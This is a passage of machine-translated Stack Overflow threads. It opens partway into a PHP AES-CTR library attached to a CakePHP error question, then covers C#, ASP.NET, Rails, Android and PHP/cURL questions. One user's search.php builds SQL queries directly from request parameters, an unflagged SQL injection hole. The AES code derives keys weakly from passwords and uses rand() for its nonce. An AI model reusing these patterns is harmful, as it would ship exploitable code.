      for ($c=0; $c<$Nb; $c++) $state[$r][$c] ^= $w[$rnd*4+$c][$r];
    }
    return $state;
  }

  private static function subBytes($s, $Nb) {    // apply SBox to state S [§5.1.1]
    for ($r=0; $r<4; $r++) {
      for ($c=0; $c<$Nb; $c++) $s[$r][$c] = self::$sBox[$s[$r][$c]];
    }
    return $s;
  }

  private static function shiftRows($s, $Nb) {    // shift row r of state S left by r bytes [§5.1.2]
    $t = array(4);
    for ($r=1; $r<4; $r++) {
      for ($c=0; $c<4; $c++) $t[$c] = $s[$r][($c+$r)%$Nb];  // shift into temp copy
      for ($c=0; $c<4; $c++) $s[$r][$c] = $t[$c];           // and copy back
    }          // note that this will work for Nb=4,5,6, but not 7,8 (always 4 for AES):
    return $s;  // see fp.gladman.plus.com/cryptography_technology/rijndael/aes.spec.311.pdf 
  }

  private static function mixColumns($s, $Nb) {   // combine bytes of each col of state S [§5.1.3]
    for ($c=0; $c<4; $c++) {
      $a = array(4);  // 'a' is a copy of the current column from 's'
      $b = array(4);  // 'b' is a•{02} in GF(2^8)
      for ($i=0; $i<4; $i++) {
        $a[$i] = $s[$i][$c];
        $b[$i] = $s[$i][$c]&0x80 ? $s[$i][$c]<<1 ^ 0x011b : $s[$i][$c]<<1;
      }
      // a[n] ^ b[n] is a•{03} in GF(2^8)
      $s[0][$c] = $b[0] ^ $a[1] ^ $b[1] ^ $a[2] ^ $a[3]; // 2*a0 + 3*a1 + a2 + a3
      $s[1][$c] = $a[0] ^ $b[1] ^ $a[2] ^ $b[2] ^ $a[3]; // a0 * 2*a1 + 3*a2 + a3
      $s[2][$c] = $a[0] ^ $a[1] ^ $b[2] ^ $a[3] ^ $b[3]; // a0 + a1 + 2*a2 + 3*a3
      $s[3][$c] = $a[0] ^ $b[0] ^ $a[1] ^ $a[2] ^ $b[3]; // 3*a0 + a1 + a2 + 2*a3
    }
    return $s;
  }

  /**
   * Key expansion for Rijndael cipher(): performs key expansion on cipher key
   * to generate a key schedule
   *
   * @param key cipher key byte-array (16 bytes)
   * @return    key schedule as 2D byte-array (Nr+1 x Nb bytes)
   */
  public static function keyExpansion($key) {  // generate Key Schedule from Cipher Key [§5.2]
    $Nb = 4;              // block size (in words): no of columns in state (fixed at 4 for AES)
    $Nk = count($key)/4;  // key length (in words): 4/6/8 for 128/192/256-bit keys
    $Nr = $Nk + 6;        // no of rounds: 10/12/14 for 128/192/256-bit keys

    $w = array();
    $temp = array();

    for ($i=0; $i<$Nk; $i++) {
      $r = array($key[4*$i], $key[4*$i+1], $key[4*$i+2], $key[4*$i+3]);
      $w[$i] = $r;
    }

    for ($i=$Nk; $i<($Nb*($Nr+1)); $i++) {
      $w[$i] = array();
      for ($t=0; $t<4; $t++) $temp[$t] = $w[$i-1][$t];
      if ($i % $Nk == 0) {
        $temp = self::subWord(self::rotWord($temp));
        for ($t=0; $t<4; $t++) $temp[$t] ^= self::$rCon[$i/$Nk][$t];
      } else if ($Nk > 6 && $i%$Nk == 4) {
        $temp = self::subWord($temp);
      }
      for ($t=0; $t<4; $t++) $w[$i][$t] = $w[$i-$Nk][$t] ^ $temp[$t];
    }
    return $w;
  }

  private static function subWord($w) {    // apply SBox to 4-byte word w
    for ($i=0; $i<4; $i++) $w[$i] = self::$sBox[$w[$i]];
    return $w;
  }

  private static function rotWord($w) {    // rotate 4-byte word w left by one byte
    $tmp = $w[0];
    for ($i=0; $i<3; $i++) $w[$i] = $w[$i+1];
    $w[3] = $tmp;
    return $w;
  }

  // sBox is pre-computed multiplicative inverse in GF(2^8) used in subBytes and keyExpansion [§5.1.1]
  private static $sBox = array(
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16);

  // rCon is Round Constant used for the Key Expansion [1st col is 2^(r-1) in GF(2^8)] [§5.2]
  private static $rCon = array( 
    array(0x00, 0x00, 0x00, 0x00),
    array(0x01, 0x00, 0x00, 0x00),
    array(0x02, 0x00, 0x00, 0x00),
    array(0x04, 0x00, 0x00, 0x00),
    array(0x08, 0x00, 0x00, 0x00),
    array(0x10, 0x00, 0x00, 0x00),
    array(0x20, 0x00, 0x00, 0x00),
    array(0x40, 0x00, 0x00, 0x00),
    array(0x80, 0x00, 0x00, 0x00),
    array(0x1b, 0x00, 0x00, 0x00),
    array(0x36, 0x00, 0x00, 0x00) ); 

} 

/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
?>

<?php
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*  AES counter (CTR) mode implementation in PHP                                                  */
/*    (c) Chris Veness 2005-2011 www.movable-type.co.uk/scripts                                   */
/*    Right of free use is granted for all commercial or non-commercial use providing this        */
/*    copyright notice is retainded. No warranty of any form is offered.                          */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */

class AesCtr extends Aes {

  /** 
   * Encrypt a text using AES encryption in Counter mode of operation
   *  - see http://csrc.nist.gov/publications/nistpubs/800-38a/sp800-38a.pdf
   *
   * Unicode multi-byte character safe
   *
   * @param plaintext source text to be encrypted
   * @param password  the password to use to generate a key
   * @param nBits     number of bits to be used in the key (128, 192, or 256)
   * @return          encrypted text
   */
  public static function encrypt($plaintext, $password, $nBits) {
    $blockSize = 16;  // block size fixed at 16 bytes / 128 bits (Nb=4) for AES
    if (!($nBits==128 || $nBits==192 || $nBits==256)) return '';  // standard allows 128/192/256 bit keys
    // note PHP (5) gives us plaintext and password in UTF8 encoding!

    // use AES itself to encrypt password to get cipher key (using plain password as source for  
    // key expansion) - gives us well encrypted key
    $nBytes = $nBits/8;  // no bytes in key
    $pwBytes = array();
    for ($i=0; $i<$nBytes; $i++) $pwBytes[$i] = ord(substr($password,$i,1)) & 0xff;
    $key = Aes::cipher($pwBytes, Aes::keyExpansion($pwBytes));
    $key = array_merge($key, array_slice($key, 0, $nBytes-16));  // expand key to 16/24/32 bytes long 

    // initialise 1st 8 bytes of counter block with nonce (NIST SP800-38A §B.2): [0-1] = millisec, 
    // [2-3] = random, [4-7] = seconds, giving guaranteed sub-ms uniqueness up to Feb 2106
    $counterBlock = array();
    $nonce = floor(microtime(true)*1000);   // timestamp: milliseconds since 1-Jan-1970
    $nonceMs = $nonce%1000;
    $nonceSec = floor($nonce/1000);
    $nonceRnd = floor(rand(0, 0xffff));

    for ($i=0; $i<2; $i++) $counterBlock[$i]   = self::urs($nonceMs,  $i*8) & 0xff;
    for ($i=0; $i<2; $i++) $counterBlock[$i+2] = self::urs($nonceRnd, $i*8) & 0xff;
    for ($i=0; $i<4; $i++) $counterBlock[$i+4] = self::urs($nonceSec, $i*8) & 0xff;

    // and convert it to a string to go on the front of the ciphertext
    $ctrTxt = '';
    for ($i=0; $i<8; $i++) $ctrTxt .= chr($counterBlock[$i]);

    // generate key schedule - an expansion of the key into distinct Key Rounds for each round
    $keySchedule = Aes::keyExpansion($key);
    //print_r($keySchedule);

    $blockCount = ceil(strlen($plaintext)/$blockSize);
    $ciphertxt = array();  // ciphertext as array of strings

    for ($b=0; $b<$blockCount; $b++) {
      // set counter (block #) in last 8 bytes of counter block (leaving nonce in 1st 8 bytes)
      // done in two stages for 32-bit ops: using two words allows us to go past 2^32 blocks (68GB)
      for ($c=0; $c<4; $c++) $counterBlock[15-$c] = self::urs($b, $c*8) & 0xff;
      for ($c=0; $c<4; $c++) $counterBlock[15-$c-4] = self::urs($b/0x100000000, $c*8);

      $cipherCntr = Aes::cipher($counterBlock, $keySchedule);  // -- encrypt counter block --

      // block size is reduced on final block
      $blockLength = $b<$blockCount-1 ? $blockSize : (strlen($plaintext)-1)%$blockSize+1;
      $cipherByte = array();

      for ($i=0; $i<$blockLength; $i++) {  // -- xor plaintext with ciphered counter byte-by-byte --
        $cipherByte[$i] = $cipherCntr[$i] ^ ord(substr($plaintext, $b*$blockSize+$i, 1));
        $cipherByte[$i] = chr($cipherByte[$i]);
      }
      $ciphertxt[$b] = implode('', $cipherByte);  // escape troublesome characters in ciphertext
    }

    // implode is more efficient than repeated string concatenation
    $ciphertext = $ctrTxt . implode('', $ciphertxt);
    $ciphertext = base64_encode($ciphertext);
    return $ciphertext;
  }

  /** 
   * Decrypt a text encrypted by AES in counter mode of operation
   *
   * @param ciphertext source text to be decrypted
   * @param password   the password to use to generate a key
   * @param nBits      number of bits to be used in the key (128, 192, or 256)
   * @return           decrypted text
   */
  public static function decrypt($ciphertext, $password, $nBits) {
    $blockSize = 16;  // block size fixed at 16 bytes / 128 bits (Nb=4) for AES
    if (!($nBits==128 || $nBits==192 || $nBits==256)) return '';  // standard allows 128/192/256 bit keys
    //$ciphertext = AesCtr::hexToStr($ciphertext);
    $ciphertext = base64_decode($ciphertext);

    // use AES to encrypt password (mirroring encrypt routine)
    $nBytes = $nBits/8;  // no bytes in key
    $pwBytes = array();
    for ($i=0; $i<$nBytes; $i++) $pwBytes[$i] = ord(substr($password,$i,1)) & 0xff;
    $key = Aes::cipher($pwBytes, Aes::keyExpansion($pwBytes));
    $key = array_merge($key, array_slice($key, 0, $nBytes-16));  // expand key to 16/24/32 bytes long

    // recover nonce from 1st element of ciphertext
    $counterBlock = array();
    $ctrTxt = substr($ciphertext, 0, 8);
    for ($i=0; $i<8; $i++) $counterBlock[$i] = ord(substr($ctrTxt,$i,1));

    // generate key schedule
    $keySchedule = Aes::keyExpansion($key);

    // separate ciphertext into blocks (skipping past initial 8 bytes)
    $nBlocks = ceil((strlen($ciphertext)-8) / $blockSize);
    $ct = array();
    for ($b=0; $b<$nBlocks; $b++) $ct[$b] = substr($ciphertext, 8+$b*$blockSize, 16);
    $ciphertext = $ct;  // ciphertext is now array of block-length strings

    // plaintext will get generated block-by-block into array of block-length strings
    $plaintxt = array();

    for ($b=0; $b<$nBlocks; $b++) {
      // set counter (block #) in last 8 bytes of counter block (leaving nonce in 1st 8 bytes)
      for ($c=0; $c<4; $c++) $counterBlock[15-$c] = self::urs($b, $c*8) & 0xff;
      for ($c=0; $c<4; $c++) $counterBlock[15-$c-4] = self::urs(($b+1)/0x100000000-1, $c*8) & 0xff;

      $cipherCntr = Aes::cipher($counterBlock, $keySchedule);  // encrypt counter block

      $plaintxtByte = array();
      for ($i=0; $i<strlen($ciphertext[$b]); $i++) {
        // -- xor plaintext with ciphered counter byte-by-byte --
        $plaintxtByte[$i] = $cipherCntr[$i] ^ ord(substr($ciphertext[$b],$i,1));
        $plaintxtByte[$i] = chr($plaintxtByte[$i]);

      }
      $plaintxt[$b] = implode('', $plaintxtByte); 
    }

    // join array of blocks into single plaintext string
    $plaintext = implode('',$plaintxt);

    return $plaintext;
  }

  /* Decode Hexadecimal */
  public static function hexToStr($hex)
  {
    $string='';
    for ($i=0; $i < strlen($hex)-1; $i+=2)
    {
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
  }

  /*
   * Unsigned right shift function, since PHP has neither >>> operator nor unsigned ints
   *
   * @param a  number to be shifted (32-bit integer)
   * @param b  number of bits to shift a to the right (0..31)
   * @return   a right-shifted and zero-filled by b bits
   */
  private static function urs($a, $b) {
    $a &= 0xffffffff; $b &= 0x1f;  // (bounds check)
    if ($a&0x80000000 && $b>0) {   // if left-most bit set
      $a = ($a>>1) & 0x7fffffff;   //   right-shift one bit & clear left-most bit
      $a = $a >> ($b-1);           //   remaining right-shifts
    } else {                       // otherwise
      $a = ($a>>$b);               //   use normal right-shift
    } 
    return $a; 
  }

}  
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
?> 
```

抱歉，我应该提到这一点，此代码在我的计算机上运行良好，当我将项目上传到服务器时出现该错误，完整的消息是：

> 注意 (8)：十六进制数太大：0x100000000 [CORE/vendors/AES/AES.php，第 230 行]
> 
> 致命错误：类声明可能未嵌套在第 30 行的 /var/www/html/myproject/cake/libs/log/file_log.php 中

所以我不知道错误是否在上面的代码中。

更新2：file_log.php，发生致命错误的地方（这里是[文件的描述](http://api13.cakephp.org/file/cake/libs/log/file_log.php)）

```
<?php
/**
 * File Storage stream for Logging
 *
 * PHP versions 4 and 5
 *
 * CakePHP(tm) :  Rapid Development Framework (http://cakephp.org)
 * Copyright 2005-2010, Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright 2005-2010, Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://www.cakefoundation.org/projects/info/cakephp CakePHP(tm) Project
 * @package       cake
 * @subpackage    cake.cake.libs.log
 * @since         CakePHP(tm) v 1.3
 * @license       MIT License (http://www.opensource.org/licenses/mit-license.php)
 */
if (!class_exists('File')) {
    require LIBS . 'file.php';
}
/**
 * File Storage stream for Logging.  Writes logs to different files
 * based on the type of log it is.
 *
 * @package cake
 * @subpackage cake.cake.libs.log
 */
class FileLog {

/**
 * Path to save log files on.
 *
 * @var string
 */
    var $_path = null;

/**
 * Constructs a new File Logger.
 * 
 * Options
 *
 * - `path` the path to save logs on.
 *
 * @param array $options Options for the FileLog, see above.
 * @return void
 */
    function FileLog($options = array()) {
        $options += array('path' => LOGS);
        $this->_path = $options['path'];
    }

/**
 * Implements writing to log files.
 *
 * @param string $type The type of log you are making.
 * @param string $message The message you want to log.
 * @return boolean success of write.
 */
    function write($type, $message) {
        $debugTypes = array('notice', 'info', 'debug');

        if ($type == 'error' || $type == 'warning') {
            $filename = $this->_path  . 'error.log';
        } elseif (in_array($type, $debugTypes)) {
            $filename = $this->_path . 'debug.log';
        } else {
            $filename = $this->_path . $type . '.log';
        }
        $output = date('Y-m-d H:i:s') . ' ' . ucfirst($type) . ': ' . $message . "\n";
        $log = new File($filename, true);
        if ($log->writable()) {
            return $log->append($output);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-19T01:17:57.523

好的，这次我的注意力更好了，这是一个可能的问题/解决方案：

您也可以发布此文件吗：`/var/www/html/myproject/cake/libs/log/file_log.php`似乎错误发生在这里而不是在 AES.php 中：

`Fatal error: Class declarations may not be nested in /var/www/html/myproject/cake/libs/log/file_log.php on line 30`

我认为**通知**和**致命错误**是两个不同的东西，不应该混在一起。有一个关于太大的整数值（转换为浮点数）和其他关于相互嵌套类的致命错误的通知。

## Aes 和 AesCtr 应该如何使用：

Aes 和 AesCtr 都是完全静态的类，因此没有必要实例化它们：

改变：

```
$aes = new AesCtr();
$decrypted = $aes->decrypt($encrypted, "mykey", 128); 
```

至：

```
$decrypted = AesCtr::decrypt($encrypted, "mykey", 128); 
```

是的，您应该放弃`$aes = new AesCtr();`，因为仅调用静态函数时不需要它。

## 这是关于通知，AES.php 第 230 行：

在第 230 行的 AES.php 中有一个十六进制数`0x100000000`，它不是有效的有符号 32 位整数（实际上，即使无符号，它也需要至少 33 位），一些 PHP 版本会抛出错误或通知它（大部分是旧的） . 我正在使用 PHP 5.3，即使使用它也不会注意到任何东西`error_reporting(E_ALL);`

有符号整数最大值是`2147483647`或以十六进制`0x7FFFFFFF`表示，AES.php 尝试使用`4294967296`转换为浮点的值。

而且，正如[language.types.integer.php](http://www.php.net/manual/en/language.types.integer.php)所说：`There is no integer division operator in PHP.`所以无论如何该值都应该转换为浮点数。

我认为问题在于，如错误消息中所述`Hex number is too big: 0x100000000`，php 尝试将该十六进制值用作整数，但它太大了，因此它首先转换为浮点数。

### 一些测试：

```
var_dump(0x100000000);
var_dump((int)0x100000000); 
```

32位系统输出：

```
float(4294967296)
int(0) 
```

与 64 位系统相同：

```
int(4294967296)
int(4294967296) 
```

## 那怎么解决呢？

这是可能有效也可能无效的解决方案：

只需替换`0x100000000`为`4294967296.0`，第 230 行将如下所示：

```
for ($c=0; $c<4; $c++) $counterBlock[15-$c-4] = self::urs($b/4294967296.0, $c*8); 
```

也许您还应该检查`urs()`尝试做什么以及如何尝试这样做。但是，它应该已经期望浮点值作为参数，请参阅[整数](http://www.php.net/manual/en/language.types.integer.php)除法。

### 更新：

检查 urs() 似乎期望 int 作为第一个 arg，但是它从`(x/y)`操作中获取，如果有分数，则在 PHP 中返回 float，否则返回 int。

再次使用 int 是简单的类型转换`(int)(x/y)`，与旧方法相比没有缺点（或很少），这只是将其转换回来。

最初，在修改之前，转换为 float 的可能性和可能性与现在相同*（`urs()`文档说第一个 arg 应该是 int）*。

```
for ($c=0; $c<4; $c++) $counterBlock[15-$c-4] = self::urs((int)($b/4294967296.0), $c*8); 
```

## 更新：file_log.php

我认为没有任何问题，据我所知`file_log.php`，它声明`class FileLog`了正确实施和关闭。

另一件事`file_log.php`是，它似乎是 cakephp 的内部库，由 cakephp 框架加载。而且我对cakephp一无所知...

但是，您确实应该测试您的代码，`AES.php`或者尝试使用`AES.php`类似这种方式的其他方式来测试您的代码**是否`App::import()`无法正常工作**：

```
/* Remember to take into account that filenames are propably
 * case sensitive at server, but maybe case insensitive at
 * your workstation (if developing under windows). */

// If needed, change vendors/AES/AES.php to correct path:
require_once 'vendors/AES/AES.php';
$decrypted = AesCtr::decrypt($encrypted, "mykey", 128); 
```

**或者也许（来自 cakephp 手册）：**

```
// Vendor not vendor and AES/AES not aes/AES or aes/aes just to be sure...
App::import('Vendor', 'AES/AES');
$decrypted = AesCtr::decrypt($encrypted, "mykey", 128); 
```

**或者完全放弃它：**

```
$decrypted = 'dummytest'; 
```

**或者可能根本不使用它：**

```
App::import('vendor', 'aes', array('file' => 'AES/AES.php'));
$decrypted = 'dummytest'; 
```

**代替：**

```
App::import('vendor', 'aes', array('file' => 'AES/AES.php'));
$decrypted = AesCtr::decrypt($encrypted, "mykey", 128); 
```

这样就缩小了问题的范围，如果仍然发生同样的错误，那么问题就在其他地方，但是如果在这个测试之后错误消失了，那么我们知道错误是在 App::import() 中或者可能在 cakephp 框架中的某个地方。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-06-11T13:53:30.197

我曾经遇到过这种错误，因为我添加了两次模型的名称，例如

```
class MyModel extends AppModel
{
 var $name ='MyModel';
 ....
 var $name = 'Another Name';
} 
```

一般来说，很难找到问题的根本原因：有时原因可能出在您可能怀疑的地方以外的地方。例如，模型中的错误可能会引发此类错误。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-10-29T20:44:30.293

我在 php 更新后开始出现此错误。每当我创建一个新`php.ini`的，错误开始弹出。我试图更改`error_reporting`,`display_errors`和其他设置，错误的关键是设置`short_open_tag.` （我仍然使用没有严格打开标记的旧库，只是“

所以，答案是：`short_open_tag`在 php.ini 中设置为“On”，重新启动 apache，错误就消失了。

仅供参考：升级到后发生在我身上`OSX Maverick`

# c# - 如何在 C# 中获得真正的 .png alpha 透明图片框

> ID：10220272
> 
> 赞同：0
> 
> 时间：2012-04-19T01:04:24.777
> 
> 标签：c#, png, transparency, background-image

我有一张背景图片。我想在背景图像上覆盖一个图片框。此叠加图像是一个带圆角的正方形。

正方形是一个 .png 文件。当它显示在表单上时，它显示为正方形，但与表单具有相同的背景。

我知道当您将背景颜色设置为透明时，它看起来像表单背景，但是如何让图片框显示下面的背景图像？

方块也会在背景图像上移动，并且在移动时需要保持透明度。

我知道这是一个非常开放的问题，但确实会有所帮助。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T07:36:41.013

如果您试图让表单本身透明但呈现背景图片以使表单看起来好像是背景图片，您应该简单地使用 TransparencyKey 属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T08:32:22.343

我有一个偷偷摸摸的怀疑，使用图片框的预期结果是不可能的。正如您已经知道的那样，图片框不是“真正的”透明度。它从字面上描绘了它所在的有透明度的父级的颜色。对于使用 GDI+ 在页面上移动的东西的真正透明的外观和感觉，您需要使用 Yorye 在他的评论中提到的 OnPaint 方法进行自定义绘画，并使用 CreateGraphics() 使用表单的 Graphics 对象绘制位图/图像功能。

# asp.net-mvc - Universal Membership Provider 创建用户性能问题

> ID：10220275
> 
> 赞同：0
> 
> 时间：2012-04-19T01:04:39.497
> 
> 标签：asp.net-mvc, azure, azure-sql-database, membership-provider, universal-provider

令我遗憾的是，我在 Azure 托管、MVC 3、SQL Azure 支持的开发中使用了最新的 Universal Providers 成员管理。我编写了一个从 CSV 文件批量创建用户的例程。解析文件并填充模型。然后我遍历创建用户的集合。

花费大量时间的关键线是标准

```
Membership.CreateUser(
   model.UserName, 
   model.Password, 
   model.Email, 
   null, 
   null, 
   model.IsApproved,
   out createStatus); 
```

即使在“大型”4 核服务器上，这一行也可能需要将近 1 秒才能完成。这意味着 10,000 个用户需要将近 3 个小时。如果可以的话，直接对数据库进行操作可能需要几分钟。

更糟糕的是，我还需要检查现有用户并更新他们。我已经放入了必要的索引，并且数据库非常快。坦率地说，这个提供商能做什么？

我做错了什么，还是这个提供者对大型系统完全没用？其他人有这些问题吗？

我什至不会进入配置文件提供程序，我只想说我自己写了！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T07:15:49.750

虽然我之前没有使用过该提供程序，但关键是同时创建多个用户。每个用户 1 秒是合理的。此外，大部分时间都花在等待数据库返回上。当当前线程正在等待数据库返回时，我建议你创建一个新线程开始创建另一个用户。所以不要在普通的foreach循环中逐个创建用户，请使用Parallel.ForEach，它会自动并行创建用户，您可以参考[http://msdn.microsoft.com/en-us/library/ dd460720.aspx](http://msdn.microsoft.com/en-us/library/dd460720.aspx)获取示例。

此致，

明旭。

# ruby-on-rails - 未定义的局部变量或方法“博客”？

> ID：10220280
> 
> 赞同：1
> 
> 时间：2012-04-19T01:05:28.050
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

我正在开发一个 Rails 应用程序，我有一个 Dashboard::user(dashboard/user) 控制器，我希望用户通过网站的后端更新他们的博客文章。这很好，但是当我试图获取用户创建的最新博客文章的列表时，我得到了一个错误。

仪表板/users_controller

```
def content
  @blog = Blog.new
  render ('content')
end 
```

仪表板/博客/_blog_list.html.erb

```
<%= div_for(:dashboard ,blog) do %>
  <%= link_to image_tag(blog.preview.url(:thumb)), dashboard_blog_path(blog) %>
  <h1><%= link_to (blog.title),dashboard_blog_path(blog) %></h1>
   <p><%= truncate blog.excerpt, length: 160 %></p>
  <%= blog.published_at %>
  <%= blog.site_id %>
<% end %> 
```

控制器

```
def content
  @site = Site.find_by_subdomain!(request.subdomain)
  @blogs = @site.blogs.all
  @blog = Blog.new

  render ('content')
end 
```

内容.html.erb

```
<%= render :partial => 'dashboard/blogs/blog_list', :locals => {:blogs => @blog} %> 
```

为什么这不起作用？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T01:09:49.817

我最好的猜测是`blog`从未设置局部变量。`@blog`将在部分中可用，但`blog`仅在显式设置时才可用，例如，如果部分是通过

```
render :partial => "blogs/blog_list", :locals => {:blog => @blog} 
```

有关部分的更多详细信息，请参阅[http://apidock.com/rails/ActionView/Partials](http://apidock.com/rails/ActionView/Partials)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:15:38.817

你有

```
div_for(:dashboard ,blog) 
```

':dashboard' 应该是 div 标签的 id 属性值的前缀吗？也就是说，你想得到这样的东西吗？

```
<div id='dashboard_blog_123'>...</div> 
```

你有这个错误的方式。尝试

```
div_for(blog, :dashboard) 
```

如果这不能解决问题，请查看您的部分是如何呈现的，以及它是否提供了一个名为“博客”的局部变量。

# android - AppWidgetProvider 和 ContentProvider

> ID：10220281
> 
> 赞同：1
> 
> 时间：2012-04-19T01:05:58.637
> 
> 标签：android, android-contentprovider, appwidgetprovider

我正在修改 WeatherListWidget 示例 Android 应用程序。就我而言，数据点可以自行更改 - 我希望这些更改能够反映在应用程序小部件显示中，而无需单击刷新按钮。

有没有教程可以解释如何做到这一点？我认为，我真正想做的就是强制刷新或更新。（是的，我对 Android 编程比较陌生）

谢谢，

[更新]

我正在显示内部传感器（由 SensorManager 管理的传感器）的值，并监听传感器值的变化。我的 SensorDataProvider 类扩展了 ContentProvider 并实现了 SensorEventListener。

因此，这将引发对显示更新的需求。最终，我可能需要控制更新率——但这不是我的直接问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T17:15:01.390

您可以在小部件清单中设置自动刷新时间，最短为 30 分钟。

如果您想更新得更快，您可以使用诸如 an`AlarmManager`和 a之类的东西`Service`以更频繁的间隔更新应用程序，但请考虑这将对用户的电池寿命产生影响。

这个小部件有一个很好的例子，说明如何使用服务和线程更频繁地更新应用程序。[谷歌代码项目在这里。](http://code.google.com/p/24clock/)

# php - 使用 cURL 连接的 xml 解析给了我这个：尝试获取非对象的属性

> ID：10220283
> 
> 赞同：0
> 
> 时间：2012-04-19T01:06:11.020
> 
> 标签：php, mysql, xml, curl, xml-parsing

我正在使用启用了 cURL 的 XAMPP，我尝试解析 php 生成的 xml，但出现此错误，请问有什么帮助吗？我的 search.php 代码：

```
 <?php
header("Content-type: text/xml");
$conn=mysql_connect("localhost","root","");
mysql_select_db("places");
$location = $_GET['location'];
$type = $_GET['type'];
if($location!="" && $type != "" ){
    $result=mysql_query("select * from accommodation WHERE location='$location' AND type= '$type'");
    }

elseif($location != "")
    {$result=mysql_query("select * from accommodation WHERE location='$location'");
}

else{echo "ERROR";
}

echo"<places>";
while($row=mysql_fetch_array($result))
    {
        echo "<place>";
        echo "<placeid>$row[ID]</placeid>";
        echo "<name>$row[name]</name>";
        echo "<type>$row[type]</type>";
        echo "<location>$row[location]</location>";
        echo "<availableroom>$row[availability]</availableroom>";
        echo "</place>";
    }

echo"</places>";

mysql_close($conn);
?> 
```

这是我的 cURL 代码：我使用 POST 从另一个页面中的表单获取位置和类型。我也使用了---> echo "The server sent back :"。htmlentities($response); 但我没有得到任何回应，只有相同的错误消息

```
 <?php
    $l = $_POST['location'];
    $t = $_POST['type'];
    $connection = curl_init();
    curl_setopt($connection, CURLOPT_URL,"search.php?location=$l&type=$t");
    curl_setopt($connection,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($connection,CURLOPT_HEADER, 0);
    $response = curl_exec($connection);
    echo "The server sent back : ". htmlentities($response);
    $xml = simplexml_load_string($response);
    for($index=0; $index < count($xml->hotel); $index++)
    {
        echo $xml->hotel[$index]->hotelid . "<br />";
        echo $xml->hotel[$index]->name . "<br />";
        echo $xml->hotel[$index]->type . "<br />";
        echo $xml->hotel[$index]->location . "<br />";
        echo $xml->hotel[$index]->availableroom . "<br />";
    }

    ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T01:30:18.590

我不清楚您是使用 curl 从外部主机还是本地主机获取 XML（在本地执行此操作没有多大意义），但无论哪种方式`"search.php?location=$l&type=$t"`都不是 curl 可以获取的有效 URL，这就是为什么`$result`为空，这就是为什么`$xml`是假而不是对象，这就是为什么你得到你得到的错误。

将协议和主机名添加到您的 URL。确保`$xml != false`之后`$xml = simplexml_load_string($response)`。

# php - 如何查询不同日期的价格

> ID：10220285
> 
> 赞同：0
> 
> 时间：2012-04-19T01:06:13.923
> 
> 标签：php, mysql

我目前正在制作酒店预订系统，想知道如何查询 tbl_prices 表中的价格列。

这是我的桌子的样子：

```
id          date_from          date_to         price          is_default
1           00-00-0000         00-00-0000      $95               1
2           05-25-2012         05-29-2012      $100              0
3           06-20-2012         06-24-2012      $90               0 
```

第一行是默认价格。因此，如果有人预订不在第 2 行和第 3 行的日期，则价格为 95 美元。但如果预订日期在第 2 排和第 3 排，那么价格应该是 100 美元或 90 美元。

